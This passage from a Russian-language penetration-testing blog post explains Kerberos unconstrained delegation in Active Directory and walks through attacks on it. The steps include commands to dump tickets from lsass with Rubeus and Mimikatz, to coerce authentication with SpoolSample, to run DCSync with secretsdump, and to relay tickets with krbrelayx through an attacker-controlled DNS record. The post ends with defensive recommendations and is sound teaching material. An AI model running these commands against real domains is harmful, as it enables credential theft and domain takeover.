Directory - процесс, работающий в контексте учетной записи своего владельца на каком-то определенном компьютере (сервере). Обычно владельцем сервиса является машинная учетная запись компьютера на котором сервис запущен, но иногда владельцем является пользовательская учетная запись. Заметим, что процесс сервиса обладает правами и привилегиями владельца сервиса.</p><p>Кроме того важно отметить, что у учетных записей есть атрибут <em>servicePrincipalName</em> в котором перечисляются имена сервисов (SPN), владельцами которых являются указанные учетные записи.</p><p><figure><img src=images/spn_example.png alt=SPN><figcaption><p style=text-align:center>Пример содержимого атрибута servicePrincipalName</p></figcaption></figure></p><p>Вот здесь проявляется одно из отличий между пользовательскими и машинными учетными записями. Дело в том, что самостоятельно изменить значение своего атрибута <em>servicePrincipalName</em> пользовательская учетная запись не может. Для изменения у учетной записи атрибута <em>servicePrincipalName</em> необходимо обладать разрешением <em>Validated-SPN</em> в отношении указанной учетной записи, а такое разрешение по умолчанию выдается административным учетным записям, а также машинными учетными записям в отношении своего собственного атрибута. То есть, машинная учетная запись по умолчанию может изменять свой собственный атрибут <em>servicePrincipalName</em>, а пользовательская нет.</p><p>Еще один атрибут учетной записи про который хочется сказать - <em>UserAccountControl</em> (не путать с механизмом контроля учетных записей). Этот атрибут хранит некоторые настройки учетной записи и по сути представляет собой битовую маску, хранимую в виде числа. Для изменения указанного атрибута требуется привилегия <em>SeEnableDelegation</em>, которой по умолчанию обладают только учетные записи с правами уровня администратора домена.</p><p><figure><img src=images/user_options.png alt=user_options><figcaption><p style=text-align:center>Содержимое вкладки Account в ADUC</p></figcaption></figure></p><p><figure><img src=images/useraccountcontrol_bits.jpg alt=unconstrained_property><figcaption><p style=text-align:center>Перечень флагов, содержащихся в атрибуте UserAccountControl</p></figcaption></figure></p><h3 id=история-и-виды-делегирования>История и виды делегирования<a hidden class=anchor aria-hidden=true href=#история-и-виды-делегирования>#</a></h3><p>Можно выделить следующие виды делегирования в Active Directory:</p><ul><li>Неограниченное (Windows 2000 Server)</li><li>Ограниченное (Windows 2003 Server)<ul><li>с использованием только Kerberos (S4U2Proxy)</li><li>c использованием любого протокола (S4U2Self + S4U2Proxy)</li></ul></li><li>Делегирование на основе ресурсов (Windows Server 2012 | S4U2Self + S4U2Proxy)</li></ul><p><em>S4U2Self</em> и <em>S4U2Proxy</em> - расширения протокола Kerberos, специально внедренные для поддержки возможности ограниченного делегирования. Подробнее указанные расширения будут рассмотрены в последующих статьях цикла.</p><h3 id=устройство-неограниченного-делегирования>Устройство неограниченного делегирования<a hidden class=anchor aria-hidden=true href=#устройство-неограниченного-делегирования>#</a></h3><p>Изначально в Windows Server 2000 появилось и было доступно только неограниченное делегирование.</p><p>Сервис, обладающий правом на неограниченное делегирование, может обратиться к любому другому сервису от имени практически любого пользователя.</p><p><figure><img src=images/unconstrained_scheme_named.svg alt=unconstrained_concept><figcaption><p style=text-align:center>Общая схема неограниченного делегирования</p></figcaption></figure></p><p>Почему практически? Дело в том, что у учетной записи пользователя может быть установлен флаг <em>NOT_DELEGATED</em> в атрибуте <em>UserAccountControl</em>, запрещающий олицетворение указанного пользователя.</p><p>По умолчанию флаг <em>NOT_DELEGATED</em> отключен и устанавливается либо при активации опции &ldquo;Account is sensitive and cannot be delegated&rdquo;, либо при добавлении пользователя в группу &ldquo;Protected Users&rdquo;.</p><blockquote><p>Примечание: среди прочего члены группы &ldquo;Protected Users&rdquo; также не могут аутентифицироваться по NTLM, использовать DES или RC4 шифрование в Kerberos, обновлять TGT по истечении 4 часов и кэшировать учетные данные для входа в домен.</p></blockquote><p>Чтобы учетная запись получила право на неограниченное делегирование в атрибуте <em>UserAccountControl</em> указанной учетной записи необходимо установить флаг <em>TRUSTED_FOR_DELEGATION</em>, которому соответствует целочисленное значение 524288. По умолчанию указанный флаг активен только у машинных учетных записей контроллеров домена.</p><p><figure><img src=images/unconstrained_property.png alt=unconstrained_property><figcaption><p style=text-align:center>Пример: у учетной записи "SQLSvc" включено неограниченное делегирование</p></figcaption></figure></p><p>Для изменения значения флага необходимо наличие привилегии <em>SeEnableDelegationPrivilege</em>, которой изначально обладают только учетные записи с правами уровня администратора домена.</p><p>Теперь рассмотрим, как устроен процесс неограниченного делегирования.</p><p><figure><img src=images/unconstrained_general_new.svg alt=unconstrained_general><figcaption><p style=text-align:center>Общая схема неограниченного делегирования</p></figcaption></figure></p><p><figure><img src=images/unconstrained_general_traffic.png alt=unconstrained_general><figcaption><p style=text-align:center>Пример сетевого трафика при неограниченном делегировании. Взят с attl4s.github.io</p></figcaption></figure></p><p>Разбор по шагам:</p><ol start=0><li>Подразумевается, что учетная запись User не является чувствительной к делегированию и не состоит в группе защищенных пользователей (флаг NOT_DELEGATED не активен).</li><li>Сначала User, как уже было рассмотрено ранее, получает TGT в результате обмена <a href=posts/kerberos_theory/#krb_as_req-%D1%81-%D0%BF%D1%80%D0%B5%D0%B4%D0%B2%D0%B0%D1%80%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE%D0%B9-%D0%B0%D1%83%D1%82%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D0%B5%D0%B9>KRB AS REQ</a> и <a href=/posts/kerberos_theory/#krb_as_rep-ad>KRB AS REP</a> сообщениями.</li><li>Далее User запрашивает TGT-билет для доступа к Сервису А (<a href=/posts/kerberos_theory/#krb_tgs_req-ad>KRB TGS REQ</a>).</li><li>KDC видит, что у Сервиса А установлен флаг &ldquo;TRUSTED_FOR_DELEGATION&rdquo;, разрешающий неограниченную делегацию, и поэтому в ответ User KDC отправляет TGS-билет с флагом ok-as-delegate.</li><li>Получив TGS-билет, User обнаруживает флаг ok-as-delegate и понимает, что ему необходимо передать свои учетные данные Сервису А. Для этого User снова обращается к KDC c просьбой выдать ему перенаправляемый (forwarded) TGT.</li><li>KDC выполняет необходимые проверки и отправляет User TGT с правом передачи.</li><li>User обращается к Сервису А с немного расширенным <a href=/posts/kerberos_theory/#krb_ap_req>KRB AP REQ</a> сообщением. Теперь в аутентификаторе содержится не только метка времени и принципал клиента, но и перенаправляемый (forwarded) TGT вместе с сессионным ключом для общения с KDC.</li><li>Сервис А извлекает сессионный ключ для общения с User из TGS-билета, расшифровывает аутентификатор, выполняет проверки и сохраняет Forwarded TGT для User вместе с соответствующим указанному билету сессионным ключом.</li><li>С использованием полученных аутентификационных данных Сервис А получает TGS-билет к Сервису Б от имени User.</li></ol><h3 id=общая-схема-атаки-при-неограниченном-делегировании>Общая схема атаки при неограниченном делегировании<a hidden class=anchor aria-hidden=true href=#общая-схема-атаки-при-неограниченном-делегировании>#</a></h3><p>Прежде чем приступить к конкретным реализациям атак, рассмотрим общий принцип и идею их проведения.</p><p><strong>Условие для проведения атаки</strong>: владение учетной записью, обладающей неограниченным делегированием.</p><p><strong>Результат успешной атаки</strong>: захват учетных записей, в том числе возможно административных, прошедших аутентификацию к сервису с настроенным неограниченным делегированием.</p><p>Изначально у атакующего имеется учетная запись с неограниченным делегированием. У учетной записи есть сервис, а сервис предполагает работу в рамках процесса операционный системы. Указанная система сохраняет Forwarded TGT доменных учетных записей, прошедших аутентификацию к сервису. Атака заключается в добыче Forwarded TGT для последующей атаки <a href=/posts/kerberos_general_attacks/#pass-the-ticket-ptt--pass-the-cache>Pass-the-ticket</a>. Важно понимать, что добытый Forwarded TGT можно использовать для доступа к любому сервису от имени соответствующего пользователя, так как делегирование неограниченное.</p><p><figure><img src=images/unconstrained_general_attack_scheme.svg alt=unconstrained_general_attack_scheme><figcaption><p style=text-align:center>Общая схема атаки с использованием неограниченного делегирования</p></figcaption></figure></p><h2 id=практика>Практика<a hidden class=anchor aria-hidden=true href=#практика>#</a></h2><p>Перейдем к реализациям атак с использованием неограниченного делегирования на практике. Рассмотрим основные этапы атак, а также различные варианты их проведения.</p><h3 id=поиск-учетных-записей-с-неограниченным-делегированием>Поиск учетных записей с неограниченным делегированием<a hidden class=anchor aria-hidden=true href=#поиск-учетных-записей-с-неограниченным-делегированием>#</a></h3><p>Несмотря на то, что для реализации атак уже подразумевается обладание учетной записью с неограниченным делегированием, а подробный разбор способов получения указанной учетной записи выходит за рамки материала, полезно рассмотреть предварительный этап с разведкой.</p><p>Существует множество инструментов, позволяющих выявить учетные записи с неограниченным делегированием.</p><p>Вариант 1 - с помощью PowerShell модуля ADSI для работы с Active Directory</p><p>Поиск среди всех учетных записей</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>([</span>adsisearcher<span class=o>]</span><span class=s1>&#39;(userAccountControl:1.2.840.113556.1.4.803:=524288)&#39;</span><span class=o>)</span>.FindAll<span class=o>()</span> 
</span></span></code></pre></div><p>Вариант 2 - с помощью <a href=https://github.com/SecureAuthCorp/impacket/blob/master/examples/findDelegation.py>FindDelegation.py</a>, входящего в Impacket</p><p>Поиск среди всех учетных записей</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>findDelegation.py -dc-ip <span class=nv>$DC_IP</span> <span class=nv>$Domain_fqdn</span>/<span class=nv>$Username</span>:<span class=nv>$Password</span>
</span></span></code></pre></div><p>Вариант 3 - PowerView</p><p>Поиск среди учетных записей класса компьютер</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-DomainComputer</span> <span class=n>-Unconstrained</span>
</span></span></code></pre></div><p>Поиск среди пользовательских учетных записей</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-DomainUser</span> <span class=n>-TrustedToAuth</span>
</span></span></code></pre></div><blockquote><p>Примечание: существует <a href=https://github.com/the-useless-one/pywerview>py-аналог</a> PowerView для Linux</p></blockquote><p>Вариант 4 - Bloodhound</p><p>Поиск среди учетных записей класса компьютер:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>match</span> <span class=p>(</span><span class=n>c:Computer</span> <span class=p>{</span><span class=n>unconstraineddelegation</span><span class=err>:</span><span class=n>true</span><span class=p>})</span> <span class=k>return</span> <span class=n>c</span><span class=p>.</span><span class=n>name</span> 
</span></span></code></pre></div><p>Поиск среди пользовательских учетных записей:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>match</span> <span class=p>(</span><span class=n>u:User</span> <span class=p>{</span><span class=n>unconstraineddelegation</span><span class=err>:</span><span class=n>true</span><span class=p>})</span> <span class=k>return</span> <span class=n>u</span><span class=p>.</span><span class=n>name</span>
</span></span></code></pre></div><p>Вариант 5 - Ldapdomaindump после Relay</p><p>Все приведенные выше способы требовали наличия прав пользователя, но также можно провести Relay атаку по протоколу LDAP на контроллер домена с последующим использованием Ldapdomaindump:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>grep TRUSTED_FOR_DELEGATION domain_computers.grep
</span></span><span class=line><span class=cl>grep TRUSTED_FOR_DELEGATION domain_users.grep
</span></span></code></pre></div><h3 id=атака-извлечение-из-памяти-сервера>Атака &ldquo;Извлечение из памяти сервера&rdquo;<a hidden class=anchor aria-hidden=true href=#атака-извлечение-из-памяти-сервера>#</a></h3><p><strong>Условие для проведения атаки</strong>: доступ с правами локального администратора к серверу с настроенным неограниченным делегированием.</p><p><strong>Некоторые варианты выполнения условия</strong>:</p><ul><li>В результате эксплуатации критической уязвимости (получаем административный доступ к системе)</li><li>Извлечь NT-хэш машинной учетной записи из недавней резервной копии (пароли автоматически сменяются каждые 30 дней)</li><li>В результате понижения версии протокола NTLMv2 до NTLMv1 с последующим перебором пароля к машинной учетной записи по радужным таблицам</li></ul><p><strong>Результат успешной атаки</strong>: доступ к учетной записи, обладающей правами уровня администратора домена.</p><p>Получив административный доступ к серверу с сервисом, обладающим неограниченным делегированием, атакующий может извлечь TGT учетных записей, проходивших аутентификацию к указанному сервису, из памяти процесса lsass.exe сервера.</p><p>Осуществить выгрузку можно с помощью Rubeus:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>Rubeus.exe dump /service:krbtgt /nowrap
</span></span></code></pre></div><p>Или при помощи Mimikatz:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>mimikatz <span class=c1># sekurlsa::tickets /export</span>
</span></span></code></pre></div><p>Полученные TGT можно использовать для проведения атаки Pass-the-Ticket.</p><p><a href=https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation>Статья</a> с примером реализации атаки.</p><h4 id=printerbug-spoolservice--ms-rprn-rpc>PrinterBug (SpoolService / MS-RPRN RPC)<a hidden class=anchor aria-hidden=true href=#printerbug-spoolservice--ms-rprn-rpc>#</a></h4><p>Но что делать, если среди учетных записей прошедших аутентификацию к сервису имеются только непривилегированные учетные записи обычных пользователей домена?</p><p>На помощь приходит еще один вид атак - &ldquo;принудительная аутентификация&rdquo;. Идея заключается в том, чтобы заставить атакуемую учетную запись пройти аутентификацию к подконтрольному сервису.</p><p>На настоящий момент известно несколько реализаций атак, направленных на принудительную аутентификацию. Более того, в последнее время появляются и новые способы, но нельзя объять необъятное. Описание всех вариантов принудительной аутентификации является предметом отдельной статьи, а может даже и не одной. Тем не менее рассмотрим и обозначим некоторые наиболее известные подходы.</p><p>Любая прошедшая проверку подлинности в домене учетная запись может удаленно подключиться к сервису печати контроллера домена и запросить обновление очереди на печать с последующим уведомлением подконтрольной системы. Таким образом можно заставить компьютер с включенным сервисом печати пройти аутентификацию к указанной системе.</p><blockquote><p>По умолчанию сервис печати на контроллере домена включен.</p></blockquote><p>Проверить наличие сервиса печати можно при помощи следующей команды:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>ls </span><span class=p>\\</span><span class=n>dc01</span><span class=p>\</span><span class=n>pipe</span><span class=p>\</span><span class=n>spoolss</span>
</span></span></code></pre></div><p>Запуск отслеживания принятых билетов с фильтрацией по конкретному отправителю:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>Rubeus.exe monitor /interval:5 /filteruser:DC$
</span></span></code></pre></div><p>Провоцирование аутентификации с использованием PrinterBug:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>SpoolSample</span><span class=p>.</span><span class=n>exe</span> <span class=nv>$DC</span> <span class=nv>$Host</span>
</span></span></code></pre></div><p>Конвертирование полученной base64-строки в билет формата kirbi:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=no>[IO.File]</span><span class=p>::</span><span class=n>WriteAllBytes</span><span class=p>(</span><span class=s2>&#34;C:\fullpathtoticket.kirbi&#34;</span><span class=p>,</span> <span class=no>[Convert]</span><span class=p>::</span><span class=n>FromBase64String</span><span class=p>(</span><span class=s2>&#34;aa…&#34;</span><span class=p>))</span>
</span></span></code></pre></div><p>Конвертирование полученного в формате kirbi билета в ccache для дальнейшего использования в Linux:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>ticketConverter.py <span class=nv>$ticket</span>.kirbi <span class=nv>$ticket</span>.ccache
</span></span></code></pre></div><p>Добавление билета в среду окружения:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>/path/to/ticket.ccache
</span></span></code></pre></div><p>Полученный TGT машинной учетной записи контроллера домена можно использовать для получения доступа к контроллеру домена или выполнения атаки DCSync:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>secretsdump.py -k -no-pass <span class=nv>$Domain_FQDN</span>/<span class=nv>$Username</span>@<span class=nv>$DC_FQDN</span>
</span></span></code></pre></div><p><a href=https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation>Статья</a> с примером реализации атаки.</p><h4 id=некоторые-способы-принудительной-аутентификации>Некоторые способы принудительной аутентификации<a hidden class=anchor aria-hidden=true href=#некоторые-способы-принудительной-аутентификации>#</a></h4><p>Ключевые слова для самостоятельного изучения:</p><ul><li>PetitPotam (EfsRpcOpenFileRaw / MS-EFSRPC)</li><li>PrivExchange</li><li>ShadowCoerce</li><li>DFSCoerce</li><li>WebDAV</li></ul><p>Полезное <a href=https://github.com/p0dalirius/Coercer>программное средство</a></p><h3 id=атака-с-использованием-учетной-записи-без-сервера>Атака с использованием учетной записи без сервера<a hidden class=anchor aria-hidden=true href=#атака-с-использованием-учетной-записи-без-сервера>#</a></h3><p><strong>Условие для проведения атаки</strong>: пароль или ключ Kerberos учетной записи, обладающей правом на неограниченное делегирование.</p><p><strong>Некоторые варианты выполнения условия</strong>:</p><ul><li>Пароль к пользовательской учетной записи может быть получен в результате атаки <a href=/posts/kerberos_general_attacks/#kerberoasting>Kerberoasting</a> или подобран оффлайн в результате перехвата Net-NTLMv2 хэша</li><li>NT хэш пароля к машинной учетной записи может быть извлечен из базы SAM при наличии прав локального администратора</li><li>Пароли (NT хэши) могут быть также извлечены из памяти какого-то сервера или рабочей станции</li></ul><p><strong>Результат успешной атаки</strong>: доступ к учетной записи, обладающей правами уровня администратора домена.</p><p>С ходу может быть не очень понятно, в чем заключается различие в условиях по сравнению с предыдущей атакой. Дело в том, что ранее подразумевалось наличие у атакующего доступа к серверу вместе с сервисом, то есть к процессу, способному обслуживать запросы пользователей. В рассматриваемом сейчас случае у атакующего нет доступа к серверу, но есть только &ldquo;бестелесная&rdquo; учетная запись. Особенно это условие актуально в случае пользовательской учетной записи. Проблема заключается в том, что негде принимать запросы на аутентификацию и неоткуда извлекать TGT.</p><p>Решение было предложено в статье <a href=https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/>&ldquo;Relaying Kerberos - Having fun with unconstrained delegation&rdquo;</a> за авторством Dirk-jan Mollema. Идея заключается в том, чтобы принудить атакуемые учетные записи пройти аутентификацию к подконтрольной системе, функционирующей не в составе домена, с сервисом, работающим в контексте скомпрометированной учетной записи, обладающей неограниченным делегированием.</p><p>Начнем по порядку разбираться, как организовать все необходимое для проведения атаки.</p><ol><li><p><strong>Злонамеренный сервис</strong>. Для корректной работы сервиса и извлечения из принятого KRB_AP_REQ сообщения Forwarded TGT клиента требуется знать ключ Kerberos учетной записи владельца указанного сервиса. Как формируется ключ учетной записи уже было рассмотрено <a href=/posts/kerberos_theory/#%D0%B0%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC-%D1%84%D0%BE%D1%80%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F-%D0%BA%D0%BB%D1%8E%D1%87%D0%B0>ранее</a>. Важно отметить, что, как правило, в зависимости от класса учетной записи используются разные алгоритмы. Для машинных учетных записей необходим AES256-ключ, а для пользовательских учетных записей нужен NT-хэш (для RC4), но в любом случае достаточно знания пароля и соли.</p></li><li><p><strong>Заманивание клиента</strong>. Теперь необходимо заставить клиента обратиться к злонамеренному сервису, чтобы передать свой Forwarded TGT. Известно несколько способов, как это осуществить, среди прочего можно выделить:<br>2.1 Атаки, направленные на перехват сетевого трафика (WPAD, MITM6, LLMNR/NBNS, ARP-spoofing, отравление DNS записей)<br>2.2 Социальная инженерия (ярлыки, письма, файлы со специальным UNC-путем - <a href=https://github.com/Greenwolf/ntlm_theft>пример</a>)<br>2.3 Третий предпочтительный способ, о котором пойдет речь дальше.</p></li></ol><p>У сервиса должно быть имя, то есть SPN. У SPN предусмотрено поле &ldquo;host&rdquo; (<a href=/posts/kerberos_theory/#%D1%81%D0%BF%D0%B8%D1%81%D0%BE%D0%BA-%D1%82%D0%B5%D1%80%D0%BC%D0%B8%D0%BD%D0%BE%D0%B2>см. ранее</a>), содержащее доменное имя хоста на котором работает сервис. За сопоставление доменного имени IP-адресу отвечает DNS-сервер. В связи с изложенным получается, что атакующему требуется, чтобы при обращении к доменному имени хоста, содержащегося в SPN сервиса, клиент получил в ответ IP-адрес злонамеренной подконтрольной системы. Как спровоцировать клиента осуществить обращение было рассмотрено в <a href=/posts/kerberos_delegation/#%D0%B0%D1%82%D0%B0%D0%BA%D0%B0-%D0%B8%D0%B7%D0%B2%D0%BB%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B8%D0%B7-%D0%BF%D0%B0%D0%BC%D1%8F%D1%82%D0%B8-%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80%D0%B0>предыдущей</a> версии атаки. Теперь рассмотрим, как получить SPN с &ldquo;host&rdquo; для которого DNS запись содержит IP-адрес системы атакующего.</p><p>Для машинных учетных записей все относительно просто. Дело в том, что указанные учетные записи самостоятельно могут добавлять себе SPN. Более того, по умолчанию каждая учетная запись в домене может добавлять новые DNS-записи.</p><p>В итоге соберем всё вместе на практике.</p><p>Сначала определяемся со способом принудительной аутентификации. Важно понимать, что принудительная аутентификация работает только для определенных service-name (см. <a href=/posts/kerberos_theory/#%D1%81%D0%BF%D0%B8%D1%81%D0%BE%D0%BA-%D1%82%D0%B5%D1%80%D0%BC%D0%B8%D0%BD%D0%BE%D0%B2>ранее</a> про SPN). Представим, что доступны две альтернативы: PrinterBug и PrivExchange. Если выбираем PrinterBug, то так как аутентификация будет осуществляться по SMB создаем сервис c service-name &ldquo;HOST&rdquo; (не путать с полем), если выбираем PrivExchange, то в качестве service-name задаем &ldquo;HTTP&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>addspn.py -u <span class=s1>&#39;DOMAIN\CompromisedAccont&#39;</span> -p <span class=s1>&#39;LMhash:NThash&#39;</span> -s <span class=s1>&#39;service-name/attacker.DOMAIN_FQDN&#39;</span> <span class=s1>&#39;DomainController&#39;</span> --additional
</span></span></code></pre></div><p>У созданной SPN добавляем DNS-запись для HOST с указанием IP-адреса системы атакующего:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>dnstool.py -u <span class=s1>&#39;DOMAIN\CompromisedAccont&#39;</span> -p <span class=s1>&#39;LMhash:NThash&#39;</span> -r <span class=s1>&#39;attacker.DOMAIN_FQDN&#39;</span> -d <span class=s1>&#39;attacker_IP&#39;</span> --action add <span class=s1>&#39;DomainController&#39;</span>
</span></span></code></pre></div><p>Запускаем на подконтрольной системе злонамеренный сервис:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>krbrelayx.py --krbsalt <span class=s1>&#39;DOMAINusername&#39;</span> --krbpass <span class=s1>&#39;password&#39;</span>
</span></span></code></pre></div><p>Осуществляем принудительную аутентификацию, например:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>SpoolSample</span><span class=p>.</span><span class=n>exe</span> <span class=nv>$DC</span> <span class=nv>$Host</span>
</span></span></code></pre></div><p>Для пользовательских учетных записей ситуация обстоит сложнее. Указанные учетные записи не могут редактировать свои SPN. Возможные варианты решения:</p><ul><li>Проверить имеющиеся в SPN сервисы на предмет наличия host с отсутствующими DNS записями. Сделать это можно при помощи обычного nslookup. Если указанные записи присутствуют, то тогда для них можно самостоятельно создать DNS с нужным IP-адресом.</li><li>Добыть учетную запись, обладающую соответствующими правами на добавление SPN в отношении имеющейся учетной записи с неограниченным делегированием.</li></ul><p>Далее все происходит аналогично случаю с машинной учетной записью.</p><blockquote><p>Рассмотренный способ проведения атаки также примечателен тем, что не требует удаленного запуска кода на стороннем сервере. Таким образом нет необходимости обходить имеющиеся на указанном сервере средства защиты.</p></blockquote><p><a href=https://exploit.ph/user-constrained-delegation.html>Статья</a> с примером реализации атаки.</p><h3 id=общая-схема-вариантов-проведения-атак>Общая схема вариантов проведения атак<a hidden class=anchor aria-hidden=true href=#общая-схема-вариантов-проведения-атак>#</a></h3><p>Исследователь Charlie Bromberg <a href=https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained>составил</a> следующую полезную схему, обобщающую рассмотренные варианты атак:</p><p><figure><img src=images/unconstrained_attack_scheme.png alt=unconstrained_attack_scheme><figcaption><p style=text-align:center>Общая схема с вариантами атак при неограниченном делегировании</p></figcaption></figure></p><h3 id=рекомендации>Рекомендации<a hidden class=anchor aria-hidden=true href=#рекомендации>#</a></h3><ul><li>Провести инвентаризацию домена на предмет наличия учетных записей с неограниченным делегированием. Следует минимизировать использование неограниченного делегирования и перейти к механизмам ограниченного делегирования. В случае невозможности перехода рекомендуется рассматривать серверы, на которых функционирует сервисы с неограниченным делегированием, как особо защищаемые объекты, компрометация которых приводит к компрометации всего домена.</li><li>Добавить критически важные учетные записи домена в группу Protected Users или активировать опцию &ldquo;Account is sensitive and cannot be delegated&rdquo; в атрибутах указанных учетных записей.</li><li>Ограничить возможность добавления машинных учетных записей в домен для непривилегированных пользователей. Установить атрибут ms-DS-MachineAccountQuota равным нулю у указанных пользователей.</li><li>Противодействовать атакам, направленным на принудительную аутентификацию:<ul><li>Отключить неиспользуемую службу печати на контроллерах домена</li><li>Установить актуальные обновления безопасности</li><li>Ограничить сетевое взаимодействие</li></ul></li><li>По возможности назначать владельцами сервисов выделенные пользовательские учетные записи. Обеспечить сложность и периодическую сменяемость паролей к указанными учетным записям.</li></ul><h2 id=используемые-источники>Используемые источники<a hidden class=anchor aria-hidden=true href=#используемые-источники>#</a></h2><ul><li>Фундаментальная <a href=https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>статья</a>, заложившая основы для атак на делегирование: &ldquo;Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory&rdquo; от Elad Shamir</li><li>Отличный доклад про делегацию в Kerberos: &ldquo;You Do (Not) Understand Kerberos Delegation&rdquo; от Daniel López Jiménez (<a href="https://www.youtube.com/watch?v=p9QFdITuvgU&list=PLwb6et4T42wwlxffjq9-F3KVDNDi9gQFs&index=1">видео</a> и <a href=https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf>презентация</a>)</li><li>Доклад &ldquo;Delegating Kerberos to bypass Kerberos delegation limitation&rdquo; от Charlie Bromberg (<a href="https://www.youtube.com/watch?v=byykEId3FUs">видео</a> и <a href="https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MHRw3PMJtbDDjbxm5ub%2Fuploads%2F1My6Zro1wos12oiKFvrT%2FInsomnihack%202022%20-%20Delegating%20Kerberos%20To%20Bypass%20Kerberos%20Delegation%20Limitations.pdf?alt=media&token=371ab075-79df-4725-8025-cf4be0609af9">презентация</a>)</li><li><a href=https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained>Материалы</a> с Hacker Recipes от Charlie Bromberg (Shutdown)</li><li><a href=https://www.tarlogic.com/blog/kerberos-iii-how-does-delegation-work/>Статья</a>: &ldquo;Kerberos (III): How does delegation work?&rdquo; от Eloy Pérez</li><li>Посты из <a href=https://t.me/cyb3r53cr3t5>телеграмм канала</a> &ldquo;СyberSecrets&rdquo;</li></ul><p>Скриншот с возможными флагами атрибута <em>UserAccountControl</em> сделан с сайта <a href=https://www.jigsolving.com/activedirectory/user-account-attributes-part-5>jigsolving.com</a>.</p><p>Скриншот с SPN взят из <a href=https://en.hackndo.com/service-principal-name-spn/>статьи</a> &ldquo;Service Principal Name (SPN)&rdquo; за авторством Pixis.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://ardent101.github.io/tags/active-directory/>Active Directory</a></li><li><a href=https://ardent101.github.io/tags/kerberos/>Kerberos</a></li><li><a href=https://ardent101.github.io/tags/pentest/>Pentest</a></li><li><a href=https://ardent101.github.io/tags/%D1%82%D0%B5%D0%BE%D1%80%D0%B8%D1%8F/>Теория</a></li><li><a href=https://ardent101.github.io/tags/%D0%B4%D0%B5%D0%BB%D0%B5%D0%B3%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5/>Делегирование</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on twitter" href="https://twitter.com/intent/tweet/?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5&url=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f&hashtags=ActiveDirectory%2cKerberos%2cPentest%2c%d0%a2%d0%b5%d0%be%d1%80%d0%b8%d1%8f%2c%d0%94%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5"><svg viewBox="0 